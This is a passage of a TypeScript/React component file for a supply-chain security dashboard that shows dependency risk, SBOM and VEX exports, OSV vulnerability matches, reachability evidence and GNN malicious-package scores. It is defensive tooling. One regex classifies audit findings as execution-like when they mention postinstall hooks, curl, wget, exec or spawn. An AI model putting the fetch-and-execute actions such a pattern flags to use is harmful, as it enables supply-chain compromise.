  return '请先完成供应链风险发现和代码可达性扫描，系统会自动生成触达路径。'
}

function reachabilityVerdictClass(verdict: ReachabilityVerdict) {
  if (verdict === 'confirmed') return severityClasses.critical
  if (verdict === 'suspected') return severityClasses.high
  if (verdict === 'not_reachable') return severityClasses.low
  return statusClasses.observed
}

function reachabilityNodeStatusLabel(status: ReachabilityNodeStatus) {
  if (status === 'confirmed') return '已证实'
  if (status === 'found') return '已发现'
  if (status === 'risk') return '高风险'
  if (status === 'missing') return '缺材料'
  return '待验证'
}

function reachabilityNodeClass(status: ReachabilityNodeStatus) {
  if (status === 'confirmed') return 'border-emerald-200 bg-emerald-50/45 dark:border-emerald-900 dark:bg-emerald-950/15'
  if (status === 'found') return 'border-cyan-200 bg-cyan-50/45 dark:border-cyan-900 dark:bg-cyan-950/15'
  if (status === 'risk') return 'border-red-200 bg-red-50/45 dark:border-red-900 dark:bg-red-950/15'
  if (status === 'missing') return 'border-slate-200 bg-slate-50/45 dark:border-slate-800 dark:bg-slate-950/15'
  return 'border-amber-200 bg-amber-50/45 dark:border-amber-900 dark:bg-amber-950/15'
}

function reachabilityNodeBadgeClass(status: ReachabilityNodeStatus) {
  if (status === 'confirmed') return statusClasses.active
  if (status === 'found') return statusClasses.observed
  if (status === 'risk') return severityClasses.high
  if (status === 'missing') return severityClasses.low
  return severityClasses.medium
}

function reachabilityMatrixCellClass(status: ReachabilityMatrixCell['status']) {
  if (status === 'hit') return 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/40 dark:text-emerald-200'
  if (status === 'risk') return 'bg-red-100 text-red-800 dark:bg-red-950/40 dark:text-red-200'
  if (status === 'na') return 'bg-muted text-muted-foreground'
  return 'bg-amber-100 text-amber-800 dark:bg-amber-950/40 dark:text-amber-200'
}

function scannerContributionText(name: string, count: number) {
  if (name.includes('Semgrep')) return count ? '贡献 import/call、危险 API 和代码模式证据。' : '用于发现代码引用和危险模式，本次未贡献风险命中。'
  if (name.includes('Gitleaks')) return count ? '贡献硬编码密钥和凭据暴露证据。' : '用于排除密钥泄漏线索，不影响可达性主线。'
  if (name.includes('Bandit')) return count ? '贡献 Python 风险路径和危险调用证据。' : '用于补充 Python 风险检查，本次没有命中。'
  return count ? '贡献 Docker、CI 或 IaC 配置入口证据。' : '用于检查构建和配置入口，异常时可稍后重试。'
}

function isExecutionLikeFinding(finding: CodeAuditFinding) {
  const text = `${finding.category} ${finding.title} ${finding.evidence} ${finding.risk_file} ${finding.rule_id}`.toLowerCase()
  return /postinstall|script|workflow|docker|ci|curl|wget|exec|spawn|subprocess|request|route|api/.test(text)
}

function CompactAuditTrend({
  trend,
  gradientId,
  variant = 'compact',
}: {
  trend: CodeAuditState['trend']
  gradientId: string
  variant?: 'compact' | 'wide'
}) {
  if (trend.length < 2) {
    return (
      <div className={cn('rounded-md border border-dashed p-3 text-sm text-muted-foreground', variant === 'wide' && 'grid h-40 place-items-center')}>
        扫描次数不足，完成 2 次以上后生成趋势。
      </div>
    )
  }

  return (
    <div className={cn('rounded-md border p-2', variant === 'wide' ? 'h-56' : 'h-40')}>
      <ResponsiveContainer width='100%' height='100%'>
        <AreaChart data={trend}>
          <defs>
            <linearGradient id={gradientId} x1='0' y1='0' x2='0' y2='1'>
              <stop offset='5%' stopColor='#0891b2' stopOpacity={0.25} />
              <stop offset='95%' stopColor='#0891b2' stopOpacity={0.02} />
            </linearGradient>
          </defs>
          <CartesianGrid strokeDasharray='3 3' vertical={false} />
          <XAxis
            dataKey='generated_at'
            tickFormatter={(value: string) => value.slice(5, 16).replace('T', ' ')}
            tick={{ fontSize: 10 }}
            minTickGap={18}
          />
          <YAxis allowDecimals={false} tick={{ fontSize: 10 }} width={28} />
          <Tooltip labelFormatter={(value) => formatLocalDateTime(String(value), { includeSeconds: true })} />
          <Area
            type='monotone'
            dataKey='total'
            name='风险总数'
            stroke='#0891b2'
            fill={`url(#${gradientId})`}
          />
        </AreaChart>
      </ResponsiveContainer>
    </div>
  )
}

export function SupplyChainPanel({
  audit,
  workspaceId,
  dependencies,
  findings,
  importId,
  onScanned,
}: {
  audit?: DependencyAuditResult | null
  workspaceId?: string
  dependencies: SecurityDependency[]
  findings: SecurityFinding[]
  importId?: string
  onScanned: (audit: DependencyAuditResult) => void
}) {
  const supplyFindings = findings.filter((finding) => finding.module.includes('供应链'))
  const [scanning, setScanning] = useState(false)
  const [enhancedSbom, setEnhancedSbom] = useState(false)
  const [severityFilter, setSeverityFilter] = useState('all')
  const [ecosystemFilter, setEcosystemFilter] = useState('all')
  const [sourceFilter, setSourceFilter] = useState('all')
  const [dependencyTypeFilter, setDependencyTypeFilter] = useState('all')
  const [selectedDependencyKey, setSelectedDependencyKey] = useState('')
  const ecosystems = useMemo(
    () => Array.from(new Set(dependencies.map((dependency) => dependency.ecosystem))).filter(Boolean),
    [dependencies]
  )
  const sourceFiles = useMemo(
    () => Array.from(new Set(dependencies.map((dependency) => dependency.source_file || dependency.manifest_type || 'unknown'))),
    [dependencies]
  )
  const vexSummary = audit?.summary.vex
  const reachabilitySummary = audit?.summary.reachability
  const vulnerabilityCoverage = audit?.summary.vulnerability_coverage
  const dependencyStats = useMemo(
    () => dependencyPanelStats(audit, dependencies, supplyFindings),
    [audit, dependencies, supplyFindings]
  )
  const filteredDependencies = useMemo(
    () =>
      dependencies.filter((dependency) => {
        const severity = dependencySeverity(dependency.risk)
        const sourceName = dependency.source_file || dependency.manifest_type || 'unknown'
        const type = dependency.dependency_type === 'transitive' ? 'transitive' : 'direct'
        return (
          (severityFilter === 'all' || severityFilter === severity) &&
          (ecosystemFilter === 'all' || ecosystemFilter === dependency.ecosystem) &&
          (sourceFilter === 'all' || sourceFilter === sourceName) &&
          (dependencyTypeFilter === 'all' || dependencyTypeFilter === type)
        )
      }),
    [dependencies, dependencyTypeFilter, ecosystemFilter, severityFilter, sourceFilter]
  )
  const selectedDependency =
    filteredDependencies.find((dependency) => dependencyKey(dependency) === selectedDependencyKey) ??
    filteredDependencies[0] ??
    dependencies[0]

  async function startDependencyScan() {
    setScanning(true)
    try {
      const nextAudit = await runDependencyAuditScan({
        workspaceId,
        importId,
        includeOsv: true,
        includeCdxgen: enhancedSbom,
        includeCyclonedxPy: enhancedSbom,
        mode: 'auto',
      })
      onScanned(nextAudit)
    } catch (error) {
      toast.error(error instanceof Error ? error.message : '依赖扫描失败')
    } finally {
      setScanning(false)
    }
  }

  async function downloadSbom() {
    try {
      const sbom = audit?.sbom ?? (await loadDependencyAuditSbom())
      downloadJson(sbom, 'supplyguard-sbom-vex.cdx.json')
      toast.success('CycloneDX SBOM + VEX 已导出')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'SBOM 导出失败')
    }
  }

  async function downloadVex() {
    try {
      const vex = audit?.vex ?? (await loadDependencyAuditVex())
      downloadJson(vex, 'supplyguard-vex.cdx.json')
      toast.success('CycloneDX VEX 已导出')
    } catch (error) {
      toast.error(error instanceof Error ? error.message : 'VEX 导出失败')
    }
  }

  return (
    <div className='grid gap-4 xl:grid-cols-[minmax(0,1fr)_340px]'>
      <Card className='rounded-md'>
        <CardHeader>
          <div className='flex flex-wrap items-start justify-between gap-3'>
            <div>
              <CardTitle className='flex items-center gap-2 text-base'>
                <PackageCheck className='size-4 text-cyan-600' />
                SBOM + VEX 可达性分析
              </CardTitle>
            </div>
            <div className='flex shrink-0 gap-2'>
              <div className='flex items-center gap-2 rounded-md border px-3 py-1.5 text-xs'>
                <Switch
                  checked={enhancedSbom}
                  onCheckedChange={setEnhancedSbom}
                  aria-label='启用外部 SBOM 工具'
                />
                增强 SBOM
              </div>
              <Button variant='outline' size='sm' onClick={() => void downloadSbom()}>
                <Download />
                SBOM+VEX
              </Button>
              <Button variant='outline' size='sm' onClick={() => void downloadVex()}>
                <FileSearch />
                VEX
              </Button>
              <Button size='sm' className={actionButtonClass} onClick={() => void startDependencyScan()} disabled={scanning}>
                {scanning ? <Loader2 className='animate-spin' /> : <RefreshCw />}
                生成 SBOM 与 VEX
              </Button>
            </div>
          </div>
        </CardHeader>
        <CardContent className='space-y-4'>
          {audit || dependencies.length ? (
            <div className='space-y-3'>
              <div className='grid gap-3 sm:grid-cols-2 xl:grid-cols-4'>
                <AuditMetric label='依赖总数' value={dependencyStats.totalDependencies} tone='cyan' />
                <AuditMetric label='风险依赖' value={dependencyStats.riskyDependencies} tone='orange' />
                <AuditMetric label='风险信号' value={dependencyStats.riskSignals} tone='red' />
                <AuditMetric label='最高风险' value={dependencyStats.maxRisk} tone='red' />
              </div>
              <div className='flex flex-wrap gap-2 text-xs text-muted-foreground'>
                <Badge variant='outline' className='rounded-md'>
                  精确版本 {audit?.summary.exact_versions ?? 0}
                </Badge>
                <Badge variant='outline' className='rounded-md'>
                  传递依赖 {audit?.summary.transitive_dependencies ?? 0}
                </Badge>
                <Badge variant='outline' className='rounded-md'>
                  OSV 命中 {audit?.summary.osv_matches ?? 0}
                </Badge>
                <Badge variant='outline' className='rounded-md'>
                  VEX 降噪 {(vexSummary?.not_affected ?? 0) + (vexSummary?.fixed ?? 0)}
                </Badge>
                <Badge variant='outline' className='rounded-md'>
                  可达 import {reachabilitySummary?.imported_dependencies ?? 0}
                </Badge>
                <Badge variant='outline' className='rounded-md'>
                  日志痕迹 {reachabilitySummary?.runtime_trace_dependencies ?? 0}
                </Badge>
              </div>
              {vulnerabilityCoverage && !vulnerabilityCoverage.complete ? (
                <Alert className='rounded-md border-amber-500/40 bg-amber-500/5'>
                  <AlertTriangle className='size-4 text-amber-500' />
                  <AlertTitle>漏洞查询覆盖不完整</AlertTitle>
                  <AlertDescription>
                    {vulnerabilityCoverage.message} 当前“OSV 命中 {audit?.summary.osv_matches ?? 0}”不代表项目没有已知漏洞。
                  </AlertDescription>
                </Alert>
              ) : null}
              <DependencyGnnSummary dependencies={dependencies} />
            </div>
          ) : (
            <Alert className='rounded-md'>
              <PackageCheck className='size-4' />
              <AlertTitle>等待锁文件依赖扫描</AlertTitle>
              <AlertDescription>
                点击“扫描依赖”后会优先读取 package-lock.json、requirements.lock.txt 或 pip freeze 环境，并生成 CycloneDX SBOM。
              </AlertDescription>
            </Alert>
          )}
          {audit?.tools?.length ? (
            <div className='flex flex-wrap gap-2'>
              {audit.tools.map((tool) => (
                <Badge
                  key={`${tool.name}-${tool.command}`}
                  variant='outline'
                  className={cn(
                    'rounded-md',
                    tool.state === 'ok'
                      ? statusClasses.active
                      : tool.state === 'missing'
                        ? statusClasses.observed
                        : severityClasses.medium
                  )}
                >
                  {tool.name}: {tool.state}
                </Badge>
              ))}
            </div>
          ) : null}
          <div className='grid gap-3 md:grid-cols-4'>
            <Select value={severityFilter} onValueChange={setSeverityFilter}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value='all'>全部严重度</SelectItem>
                <SelectItem value='critical'>严重</SelectItem>
                <SelectItem value='high'>高危</SelectItem>
                <SelectItem value='medium'>中危</SelectItem>
                <SelectItem value='low'>低危</SelectItem>
              </SelectContent>
            </Select>
            <Select value={ecosystemFilter} onValueChange={setEcosystemFilter}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value='all'>全部生态</SelectItem>
                {ecosystems.map((ecosystem) => (
                  <SelectItem key={ecosystem} value={ecosystem}>
                    {ecosystem}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            <Select value={sourceFilter} onValueChange={setSourceFilter}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value='all'>全部来源</SelectItem>
                {sourceFiles.map((sourceFile) => (
                  <SelectItem key={sourceFile} value={sourceFile}>
                    {sourceFile}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            <Select value={dependencyTypeFilter} onValueChange={setDependencyTypeFilter}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value='all'>全部类型</SelectItem>
                <SelectItem value='direct'>直接依赖</SelectItem>
                <SelectItem value='transitive'>传递依赖</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>依赖</TableHead>
                <TableHead>生态</TableHead>
                <TableHead>来源</TableHead>
                <TableHead>许可证</TableHead>
                <TableHead>VEX</TableHead>
                <TableHead>信号</TableHead>
                <TableHead className='w-[150px]'>风险</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {filteredDependencies.length ? filteredDependencies.map((dependency) => (
                <TableRow
                  key={dependencyKey(dependency)}
                  className='cursor-pointer'
                  onClick={() => setSelectedDependencyKey(dependencyKey(dependency))}
                  data-state={dependencyKey(dependency) === dependencyKey(selectedDependency) ? 'selected' : undefined}
                >
                  <TableCell>
                    <div className='font-medium'>{dependency.name}</div>
                    <div className='flex flex-wrap items-center gap-1 text-xs text-muted-foreground'>
                      <span>{dependency.version}</span>
                      {dependency.resolved ? (
                        <Badge variant='outline' className='rounded-md px-1.5 py-0 text-[10px]'>
                          精确
                        </Badge>
                      ) : null}
                    </div>
                    {dependency.requested_version && dependency.requested_version !== dependency.version ? (
                      <div className='text-[11px] text-muted-foreground'>
                        requested {dependency.requested_version}
                      </div>
                    ) : null}
                    {dependency.purl ? (
                      <div className='mt-1 max-w-[260px] truncate font-mono text-[11px] text-muted-foreground'>
                        {dependency.purl}
                      </div>
                    ) : null}
                  </TableCell>
                  <TableCell>{dependency.ecosystem}</TableCell>
                  <TableCell>
                    <div className='flex flex-wrap gap-1'>
                      <Badge variant='outline' className='rounded-md'>
                        {versionSourceLabel(dependency.version_source)}
                      </Badge>
                      <Badge variant='outline' className='rounded-md'>
                        {dependency.dependency_type === 'transitive' ? '传递' : '直接'}
                      </Badge>
                    </div>
                    <div className='max-w-[180px] truncate text-xs text-muted-foreground'>
                      {dependency.source_file ?? dependency.manifest_type ?? '-'}
                    </div>
                  </TableCell>
                  <TableCell>{dependency.license}</TableCell>
                  <TableCell>
                    <DependencyVexBadge dependency={dependency} />
                  </TableCell>
                  <TableCell>
                    <div className='flex flex-wrap gap-1'>
                      {dependency.signals.slice(0, 3).map((signal) => (
                        <Badge key={signal} variant='outline' className='rounded-md'>
                          {signal}
                        </Badge>
                      ))}
                      {dependency.signals.length > 3 ? (
                        <Badge variant='outline' className='rounded-md'>
                          +{dependency.signals.length - 3}
                        </Badge>
                      ) : null}
                    </div>
                  </TableCell>
                  <TableCell>
                    <RiskBar value={dependency.risk} />
                    <DependencyGnnBadge dependency={dependency} />
                  </TableCell>
                </TableRow>
              )) : (
                <TableRow>
                  <TableCell colSpan={7} className='h-28 text-center text-sm text-muted-foreground'>
                    暂无符合筛选条件的依赖数据
                  </TableCell>
                </TableRow>
              )}
            </TableBody>
          </Table>
        </CardContent>
      </Card>

      <Card className='rounded-md'>
      <CardHeader>
        <CardTitle className='flex items-center gap-2 text-base'>
          <Boxes className='size-4 text-orange-600' />
          选中依赖详情
        </CardTitle>
      </CardHeader>
        <CardContent className='space-y-4'>
          {selectedDependency ? (
            <>
              <DependencyGnnEvidence dependency={selectedDependency} />
              <DependencyVexRecommendation dependency={selectedDependency} />
            </>
          ) : null}
          {supplyFindings.map((finding) => (
            <Alert key={finding.id} className='rounded-md'>
              <ShieldAlert className='size-4' />
              <AlertTitle className='line-clamp-2'>{localizedFindingTitle(finding.title)}</AlertTitle>
              <AlertDescription>
                <div className='mt-1 line-clamp-3 text-sm leading-6'>
                  {summarizeFindingEvidence(finding.evidence)}
                </div>
                <div className='mt-2 flex flex-wrap gap-1'>
                  <Badge variant='outline' className={cn('rounded-md', severityClasses[finding.severity])}>
                    {severityLabel(finding.severity)}
                  </Badge>
                  <Badge variant='outline' className='rounded-md'>
                    风险 {finding.score}
                  </Badge>
                </div>
              </AlertDescription>
            </Alert>
          ))}
        </CardContent>
      </Card>
    </div>
  )
}

function DependencyVexBadge({ dependency }: { dependency: SecurityDependency }) {
  const status = dominantVexStatus(dependency)
  if (!status) {
    return (
      <Badge variant='outline' className='rounded-md'>
        无 CVE
      </Badge>
    )
  }
  return (
    <Badge variant='outline' className={cn('rounded-md', vexStatusClass(status))}>
      {vexStatusLabel(status)}
    </Badge>
  )
}

function DependencyGnnSummary({ dependencies }: { dependencies: SecurityDependency[] }) {
  const gnnDependencies = dependenciesWithGnn(dependencies)
  const judgedDependencies = gnnDependencies.filter(isGnnJudged)
  if (!gnnDependencies.length) {
    return null
  }
  const highCount = judgedDependencies.filter((dependency) => dependency.gnn_label === 'high').length
  const elevatedCount = judgedDependencies.filter((dependency) => dependency.gnn_label === 'elevated').length
  const confidences = judgedDependencies
    .map((dependency) => dependency.gnn_confidence)
    .filter((value): value is number => typeof value === 'number')
  const avgConfidence = confidences.length
    ? confidences.reduce((total, value) => total + value, 0) / confidences.length
    : null
  const modelTypes = Array.from(new Set(gnnDependencies.map((dependency) => dependency.gnn_model_type).filter(Boolean)))
  const topDependencies = topGnnDependencies(dependencies, 4)

  return (
    <div className='rounded-md border border-cyan-200/70 bg-cyan-50/45 p-3 dark:border-cyan-900/70 dark:bg-cyan-950/15'>
      <div className='flex flex-wrap items-center justify-between gap-2'>
        <div className='flex items-center gap-2 text-sm font-medium'>
          <BrainCircuit className='size-4 text-cyan-600' />
          GNN 恶意包判定证据
        </div>
        <div className='flex flex-wrap gap-1'>
          {modelTypes.slice(0, 2).map((model) => (
            <Badge key={model} variant='outline' className='rounded-md bg-background text-[10px]'>
              {model}
            </Badge>
          ))}
        </div>
      </div>

      <div className='mt-3 grid gap-2 text-xs sm:grid-cols-5'>
        <InfoPill label='覆盖依赖' value={`${gnnDependencies.length}/${dependencies.length}`} />
        <InfoPill label='恶意倾向' value={String(highCount)} />
        <InfoPill label='可疑倾向' value={String(elevatedCount)} />
        <InfoPill label='平均判定确定度' value={avgConfidence === null ? '-' : formatPercent(avgConfidence)} />
        <InfoPill label='暂不判定' value={String(gnnDependencies.length - judgedDependencies.length)} />
      </div>

      <div className='mt-3 grid gap-2 md:grid-cols-2'>
        {topDependencies.map((dependency) => (
          <div key={dependencyKey(dependency)} className='rounded-md border bg-background/80 p-2'>
            <div className='flex items-center justify-between gap-2'>
              <div className='min-w-0 truncate text-sm font-medium'>{dependency.name}</div>
              <Badge
                variant='outline'
                className={cn('shrink-0 rounded-md text-[10px]', severityClasses[dependencyGnnSeverity(dependency)])}
              >
                {gnnScoreLabel(dependency, formatPercent(dependency.gnn_score ?? 0))}
              </Badge>
            </div>
            <div className='mt-1 truncate text-[11px] text-muted-foreground'>
              {dependency.gnn_explanations?.[0] || dependency.gnn_reasons?.[0] || dependency.gnn_model_type || 'malicious package similarity signal'}
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}

function dependenciesWithGnn(dependencies: SecurityDependency[]) {
  return dependencies.filter((dependency) => typeof dependency.gnn_score === 'number')
}

function topGnnDependencies(dependencies: SecurityDependency[], limit: number) {
  return dependenciesWithGnn(dependencies)
    .filter(isGnnJudged)
    .slice()
    .sort((left, right) => (right.gnn_score ?? 0) - (left.gnn_score ?? 0))
    .slice(0, limit)
}

function dependencyGnnSeverity(dependency: SecurityDependency): SecuritySeverity {
  if (resolveGnnDecisionStatus(dependency) === 'conflict') return 'high'
  if (dependency.gnn_label === 'high') return 'high'
  if (dependency.gnn_label === 'elevated') return 'medium'
  return 'low'
}

function DependencyGnnBadge({ dependency }: { dependency: SecurityDependency }) {
  if (typeof dependency.gnn_score !== 'number') {
    return null
  }
  const decisionStatus = resolveGnnDecisionStatus(dependency)
  if (decisionStatus === 'abstain' || decisionStatus === 'unavailable') {
    return (
      <Badge
        variant='outline'
        className='mt-1 w-fit rounded-md border-amber-400/50 bg-amber-50 text-[10px] text-amber-700 dark:bg-amber-950/20 dark:text-amber-200'
        title={decisionStatus === 'abstain' ? '输入超出训练分布，模型已拒绝给出确定结论' : '当前没有通过兼容性门禁的模型'}
      >
        {decisionStatus === 'abstain' ? 'GNN 暂不判定' : '模型不可用'}
      </Badge>
    )
  }
  const score = Math.round(dependency.gnn_score * 100)
  const tone =
    decisionStatus === 'conflict'
      ? severityClasses.high
      : dependency.gnn_label === 'high'
      ? severityClasses.high
      : dependency.gnn_label === 'elevated'
        ? severityClasses.medium
        : severityClasses.low
  return (
    <Badge
      variant='outline'
      className={cn('mt-1 w-fit rounded-md text-[10px]', tone)}
      title={dependency.gnn_reasons?.join('；') || '恶意包概率或相似度不是总体风险评分'}
    >
      {gnnScoreLabel(dependency, `${score}%`)}
    </Badge>
  )
}

function DependencyVexRecommendation({ dependency }: { dependency: SecurityDependency }) {
  const statements = dependency.vex ?? []
  const visibleStatements = statements.slice(0, 3)
  const hiddenStatementCount = Math.max(0, statements.length - visibleStatements.length)
  const osvIds = dependency.vulnerabilities?.map((vulnerability) => vulnerability.id).filter(Boolean) ?? []
  const uniqueOsvIds = Array.from(new Set(osvIds))
  const status = dominantVexStatus(dependency)

  return (
    <div className='rounded-md border p-3'>
      <div className='flex items-start justify-between gap-3'>
        <div className='min-w-0'>
          <div className='truncate font-medium'>{dependency.name}</div>
          <div className='text-xs text-muted-foreground'>
            {dependency.version} · {versionSourceLabel(dependency.version_source)}
          </div>
        </div>
        <Badge variant='outline' className='rounded-md'>
          风险 {dependency.risk}
        </Badge>
      </div>

      <div className='mt-3 rounded-md border bg-muted/25 p-3'>
        <div className='text-xs font-medium text-muted-foreground'>核心结论</div>
        <p className='mt-1 text-sm leading-6'>{dependencyRecommendationText(dependency)}</p>
      </div>

      <DependencyEvidenceSummary dependency={dependency} />

      <div className='mt-3 grid gap-2 text-xs text-muted-foreground'>
        <div>生态：{dependency.ecosystem || '-'}</div>
        <div>来源：{dependency.source_file || dependency.manifest_type || '-'}</div>
        <div>许可证：{dependency.license || '未知'}</div>
        <div>类型：{dependency.dependency_type === 'transitive' ? '传递依赖' : '直接依赖'}</div>
      </div>

      <Collapsible className='mt-3'>
        <CollapsibleTrigger asChild>
          <Button variant='outline' size='sm' className='w-full justify-between rounded-md'>
            查看技术细节
            <ChevronDown className='size-4' />
          </Button>
        </CollapsibleTrigger>
        <CollapsibleContent className='mt-3 space-y-3'>
          {uniqueOsvIds.length ? (
            <div className='rounded-md border bg-muted/20 p-2'>
              <div className='mb-2 text-xs font-medium'>OSV 漏洞编号</div>
              <div className='flex flex-wrap gap-1'>
                {uniqueOsvIds.slice(0, 6).map((id) => (
                  <Badge key={id} variant='outline' className='rounded-md font-mono text-[10px]'>
                    {id}
                  </Badge>
                ))}
                {uniqueOsvIds.length > 6 ? (
                  <Badge variant='outline' className='rounded-md text-[10px]'>
                    +{uniqueOsvIds.length - 6} 更多
                  </Badge>
                ) : null}
              </div>
            </div>
          ) : null}

          {visibleStatements.length ? (
            <div className='space-y-2'>
              <div className='text-xs font-medium text-foreground'>VEX 判断</div>
              {visibleStatements.map((statement) => (
                <div key={`${statement.id}-${statement.status}`} className='rounded-md border bg-muted/25 p-2'>
                  <div className='mb-1 flex flex-wrap items-center gap-2'>
                    <Badge variant='outline' className={cn('rounded-md', vexStatusClass(statement.status))}>
                      {vexStatusLabel(statement.status)}
                    </Badge>
                    <code className='font-mono text-[11px] text-muted-foreground'>{statement.id}</code>
                  </div>
                  <div className='text-xs leading-5 text-muted-foreground'>
                    {vexStatementText(dependency, statement)}
                  </div>
                </div>
              ))}
              {hiddenStatementCount ? (
                <div className='text-xs text-muted-foreground'>另有 {hiddenStatementCount} 条 VEX 判断已折叠。</div>
              ) : null}
            </div>
          ) : (
            <div className='rounded-md border border-dashed p-2 text-xs text-muted-foreground'>
              当前依赖没有漏洞 statement；继续保留 SBOM 组件与许可证证据。
            </div>
          )}

          <DependencyVexDetails dependency={dependency} />

          {status ? (
            <div className='rounded-md border bg-muted/20 p-2 text-xs leading-5 text-muted-foreground'>
              当前准入状态为 <span className='font-medium text-foreground'>{vexStatusLabel(status)}</span>。
              该状态由漏洞命中、可达性佐证、服务暴露面和运行日志证据综合生成。
            </div>
          ) : null}
        </CollapsibleContent>
      </Collapsible>
    </div>
  )
}

function DependencyGnnEvidence({ dependency }: { dependency: SecurityDependency }) {
  const explanations = dependency.gnn_explanations?.length
    ? dependency.gnn_explanations
    : dependency.gnn_reasons ?? []
  const similarPackages = dependency.similar_malicious_packages ?? []
  const hasModelEvidence =
    dependency.gnn_model_type
    || typeof dependency.gnn_confidence === 'number'
    || explanations.length
    || similarPackages.length

  if (!hasModelEvidence) {
    return null
  }

  return (
    <div className='mt-3 rounded-md border bg-cyan-50/45 p-3 dark:bg-cyan-950/15'>
      <div className='flex flex-wrap items-center gap-2'>
        <div className='text-xs font-medium'>GNN 模型证据</div>
        {dependency.gnn_model_type ? (
          <Badge variant='outline' className='rounded-md text-[10px]'>
            {dependency.gnn_model_type}
          </Badge>
        ) : null}
        {typeof dependency.gnn_confidence === 'number' ? (
          <Badge variant='outline' className='rounded-md bg-background text-[10px]'>
            判定确定度 {formatPercent(dependency.gnn_confidence)}
          </Badge>
        ) : null}
        {resolveGnnDecisionStatus(dependency) === 'abstain' ? (
          <Badge variant='outline' className='rounded-md border-amber-400/50 bg-amber-50 text-[10px] text-amber-700 dark:bg-amber-950/20 dark:text-amber-200'>
            超出训练分布
          </Badge>
        ) : null}
      </div>

      <p className='mt-2 text-[11px] leading-5 text-muted-foreground'>
        GNN 目标是识别恶意包相似度，不替代漏洞扫描。判定确定度不是准确率；当前结果还会结合漏洞、调用和其他证据。
      </p>

      {dependency.gnn_inference_mode === 'package_features_only' ? (
        <div className='mt-2 rounded-md border border-amber-300/50 bg-amber-50 px-2.5 py-2 text-[11px] leading-5 text-amber-800 dark:border-amber-900/60 dark:bg-amber-950/20 dark:text-amber-200'>
          当前为单包特征推理，未接入项目实时依赖图，模型信号仅作辅助参考。
        </div>
      ) : null}

      {resolveGnnDecisionStatus(dependency) === 'abstain' ? (
        <div className='mt-2 rounded-md border border-amber-300/50 bg-amber-50 px-2.5 py-2 text-[11px] leading-5 text-amber-800 dark:border-amber-900/60 dark:bg-amber-950/20 dark:text-amber-200'>
          输入超出训练分布，模型已降低确定度；不要把该分数作为放行依据。
        </div>
      ) : null}

      {resolveGnnDecisionStatus(dependency) === 'conflict' ? (
        <div className='mt-2 rounded-md border border-red-300/50 bg-red-50 px-2.5 py-2 text-[11px] leading-5 text-red-800 dark:border-red-900/60 dark:bg-red-950/20 dark:text-red-200'>
          恶意包概率或相似度较低，但与漏洞或综合风险强证据冲突；不能据此降低总体风险。
        </div>
      ) : null}

      {explanations.length ? (
        <ul className='mt-2 space-y-1 text-xs leading-5 text-muted-foreground'>
          {explanations.slice(0, 4).map((reason) => (
            <li key={reason} className='flex gap-2'>
              <span className='mt-2 size-1.5 shrink-0 rounded-full bg-cyan-500' />
              <span>{reason}</span>
            </li>
          ))}
        </ul>
      ) : null}

        {similarPackages.length ? (
        <div className='mt-2 flex flex-wrap gap-1'>
          {similarPackages.slice(0, 4).map((item) => (
            <Badge key={`${item.package}-${item.score}`} variant='outline' className='rounded-md bg-background text-[10px]'>
              {item.package || 'similar'} {typeof item.score === 'number' ? formatPercent(item.score) : ''}
            </Badge>
          ))}
        </div>
      ) : null}
    </div>
  )
}

function DependencyEvidenceSummary({
  dependency,
  compact = false,
}: {
  dependency: SecurityDependency
  compact?: boolean
}) {
  const reachability = dependency.reachability
  const statements = dependency.vex ?? []
  const vulnerabilities = dependency.vulnerabilities ?? []
  const codeEvidenceCount = (reachability?.call_evidence?.length ?? 0) + (reachability?.code_evidence?.length ?? 0)
  const runtimeEvidenceCount = reachability?.runtime_evidence?.length ?? 0
  const affectedCount = statements.filter((statement) => statement.status === 'affected').length

  return (
    <div className={cn('mt-3 grid gap-2', compact ? 'grid-cols-2' : 'grid-cols-2')}>
      <EvidencePill label='公开漏洞' value={vulnerabilities.length} active={vulnerabilities.length > 0} />
      <EvidencePill label='VEX 受影响' value={affectedCount} active={affectedCount > 0} />
      <EvidencePill label='代码证据' value={codeEvidenceCount} active={codeEvidenceCount > 0} />
      <EvidencePill label='日志证据' value={runtimeEvidenceCount} active={runtimeEvidenceCount > 0} />
    </div>
  )
}

function EvidencePill({ label, value, active }: { label: string; value: number; active: boolean }) {
  return (
    <div className={cn(
      'rounded-md border px-2 py-1.5 text-xs',
      active ? 'border-cyan-200 bg-cyan-50 text-cyan-800 dark:border-cyan-900 dark:bg-cyan-950/35 dark:text-cyan-200' : 'text-muted-foreground'
    )}>
      <div className='text-[11px]'>{label}</div>
      <div className='text-sm font-semibold'>{value}</div>
    </div>
  )
}

function DependencyVexDetails({ dependency }: { dependency: SecurityDependency }) {
  const reachability = dependency.reachability
  const codeEvidence = [...(reachability?.call_evidence ?? []), ...(reachability?.code_evidence ?? [])].slice(0, 3)
  const attackSurface = reachability?.attack_surface_evidence ?? []
  const runtimeEvidence = reachability?.runtime_evidence ?? []

  return (
    <div className='mt-3 space-y-3'>
      <div className='grid grid-cols-2 gap-2 text-xs'>
        <ReachabilityFlag label='代码 import' active={Boolean(reachability?.imported)} />
        <ReachabilityFlag label='调用证据' active={Boolean(reachability?.called)} />
        <ReachabilityFlag label='服务暴露' active={Boolean(reachability?.attack_surface)} />
        <ReachabilityFlag label='日志痕迹' active={Boolean(reachability?.runtime_trace)} />
      </div>

      <ReachabilityEvidenceList title='代码证据' items={codeEvidence} />
      <ReachabilityEvidenceList title='攻击面证据' items={attackSurface} />
      <ReachabilityEvidenceList title='日志证据' items={runtimeEvidence} />
    </div>
  )
}

function ReachabilityFlag({ label, active }: { label: string; active: boolean }) {
  return (
    <div className={cn(
      'flex items-center justify-between rounded-md border px-2 py-1.5',
      active ? 'border-emerald-200 bg-emerald-50 text-emerald-700 dark:border-emerald-900 dark:bg-emerald-950/35 dark:text-emerald-300' : 'text-muted-foreground'
    )}>
